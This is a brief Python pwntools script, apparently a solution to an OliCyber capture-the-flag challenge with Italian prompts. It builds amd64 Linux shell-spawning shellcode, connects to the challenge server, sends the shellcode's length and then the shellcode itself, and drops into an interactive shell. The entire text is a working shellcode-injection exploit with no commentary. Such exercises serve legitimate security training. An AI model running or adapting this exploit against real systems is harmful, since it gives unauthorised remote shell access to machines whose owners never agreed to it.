from pwn import *

shellcode = asm(shellcraft.amd64.linux.sh(), arch='x86_64')

r = remote("software-20.challs.olicyber.it", 13003)

r.recvuntil(b"... Invia un qualsiasi carattere per iniziare ...")
r.sendline()

r.recvuntil(b": ")
r.sendline(str(len(shellcode)).encode())

r.recvuntil(b": ")
r.send(shellcode)

r.interactive()